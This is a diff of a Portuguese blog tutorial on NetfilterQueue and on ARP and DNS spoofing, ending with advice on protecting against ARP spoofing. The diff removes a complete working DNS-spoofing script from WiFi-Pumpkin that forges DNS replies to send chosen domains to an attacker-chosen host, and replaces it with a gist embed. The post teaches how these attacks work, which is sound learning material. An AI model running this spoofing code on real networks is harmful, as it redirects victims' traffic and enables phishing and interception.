@@ -65,7 +65,7 @@ Para entender como funciona **NFqueue** precisamos entender como a arquitetura d
 ```
 iptables -I INPUT -d 192.168.0.0/24 -j NFQUEUE --queue-num 1
 ```
-Essa fila de pacotes é implementada como uma lista encadeada, que os elementos são os pacotes e os metadados (linux **skb** socket buffer), dessa forma você acabando entendendo o perigo como algumas rootkits para linux se esconde na rede (detalhe mesmo em userland), quando você tiver um tempo pesquise sobre o protocolo que fica entre o userspace e kernel chamado **nfnetlink**, sem spoiler. Olha só como é simples usar esse módulo para controlar o fluxo de packets na rede.
+Essa fila de pacotes é implementada como uma lista encadeada, que os elementos são os pacotes e os metadados (linux **skb** socket buffer), quando você tiver um tempo pesquise sobre o protocolo que fica entre o userspace e kernel chamado **nfnetlink**, sem spoiler. Olha só como é simples usar esse módulo para controlar o fluxo de packets na rede.
 
 ``` py
 from netfilterqueue import NetfilterQueue
@@ -263,84 +263,8 @@ Perceba que o endereço físico do **atacante** está igual ao endereço físico
 
 código do Dnspoof usando module NetfilterQueue:
 
-``` python
-#!/usr/bin/env python
-import argparse
-import logging
-logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
-from scapy.all import *
-from netfilterqueue import NetfilterQueue
 
-"""
-Description:
-    This program is a module for wifi-pumpkin.py file which includes new implementation
-    for Dns spoof Attack with NetfilterQueue and iptables.
-
-Copyright:
-    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>
-"""
-
-class DnsSpoofNetFilter(object):
-    def __init__(self):
-        """ implementation Dnsspoof with Netfilterqueue modules"""
-        description = "Module DNS spoofing v0.1"
-        usage = "Usage: use --help for futher information"
-        parser = argparse.ArgumentParser(description = description, usage = usage)
-        parser.add_argument('-d','--domains', dest = 'domains', help = 'Specify the domains', required = True)
-        parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
-        self.args = parser.parse_args()
-
-    def callback(self,packet):
-        payload = packet.get_payload()
-        pkt = IP(payload)
-        if not pkt.haslayer(DNSQR):
-            packet.accept()
-        else:
-            if pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1] in self.domain:
-                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
-                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
-                packet.set_payload(str(spoofed_pkt))
-                send(spoofed_pkt,verbose=False)
-                packet.accept()
-            elif len(self.domain) == 1 and self.domain[0] == '':
-                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
-                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
-                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
-                packet.set_payload(str(spoofed_pkt))
-                send(spoofed_pkt,verbose=False)
-                packet.accept()
-            else:
-                packet.accept()
-
-    def main(self):
-        self.redirect, self.domain = self.args.redirect, self.args.domains.split(',')
-        self.q = NetfilterQueue()
-        self.q.bind(0, self.callback)
-        self.q.run()
-
-if __name__ == "__main__":
-    dnsspoof = DnsSpoofNetFilter()
-    dnsspoof.main()
-```
+<script src="https://gist.github.com/mh4x0f/25ba9dabe29541c2c269f92c9e179855.js"></script>
 
 ### Proteções contra ARP spoof
 
@@ -350,12 +274,12 @@ Para se proteger desse tipo ataque, você pode evitar acessar redes desconhecida
 netsh interface ipv4 add neighbors "Local Area Connection" Gateway MAC
 ```
 
-Por último e não menos importante temos a melhor solução de todas, essa é a solução que funciona para qualquer sistema operacional,"remova o cabo da internet ou do roteador".
+Por último e não menos importante temos a melhor solução de todas, essa é a solução que funciona para qualquer sistema operacional,"remova o cabo da internet ou do roteador". Isso é tudo pessoal.
 
 
 ### Conclusão
 
-Bricadeiras a parte isso é tudo pessoal, espero que tenha ajudado algum curioso como eu que sempre está aprendendo coisas novas. Portanto, obtemos que usar o **NetfilterQueue** é a melhor opção por enquanto pois temos um maior controle sobre o pacote, podendo usar para diferentes fim, analise de malware, ataque direcionado, ataque em determina aplicação ou até mesmo implementação de controle de acesso. Em fim, as possibilidades são muitas só depende agora dá sua criatividade.
+Espero que tenha ajudado algum curioso como eu que sempre está aprendendo coisas novas. Portanto, obtemos que usar o **NetfilterQueue** é a melhor opção, pois temos um maior controle sobre o pacote podendo usar para diferentes fim: analise de malware, ataque direcionado, ataque em determina aplicação ou até mesmo implementação de controle de acesso. Em fim, as possibilidades são muitas só depende agora dá sua criatividade.
 
 Qualquer crítica pode deixar nós comentários recomendo fortemente :D, até um futuro próximo.
 
@@ -363,10 +287,11 @@ by: Marcos Bomfim a.k.a mh4x0f
 
 Referências:
 
->
+```
 https://pt.wikipedia.org/wiki/Ataque_man-in-the-middle
 http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
 https://pt.wikipedia.org/wiki/ARP_spoofing
 http://ispipdatanetworks-learning.blogspot.com/2015/10/arp-packet-format-and-different-types.html
 https://serverfault.com/questions/102736/persistent-static-arp-entries-on-windows-is-it-possible
 https://superuser.com/questions/391108/how-can-i-add-an-active-arp-entry-on-win-7
+```
